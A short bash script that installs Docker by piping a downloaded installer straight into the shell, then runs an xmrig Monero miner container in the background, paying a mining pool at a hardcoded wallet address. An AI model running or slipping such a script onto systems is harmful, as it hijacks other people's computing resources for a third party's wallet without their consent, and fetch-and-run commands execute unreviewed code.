#!/bin/bash

# Download and install Docker
curl -fsSL https://get.docker.com | sh

# Add the current user to the Docker group to run Docker without sudo
sudo usermod -aG docker $USER

# Start Docker service
sudo systemctl start docker

# Pull the giansalex/monero-miner image from Docker Hub
sudo docker pull giansalex/monero-miner

# Run the Monero miner container
sudo docker run -d giansalex/monero-miner /xmr/xmrig \
     -o pool.supportxmr.com:3333 \
     -u 4Ac3QisYNfee5A21H75Qt4c8C9GGRhstENAQxqACn8TP4U3gdsm2Cno5VC4Cqw8FqD4tmnaoDPyKqToYXerx5ybSS87s28V \
     -k \
     --cpu-priority=2
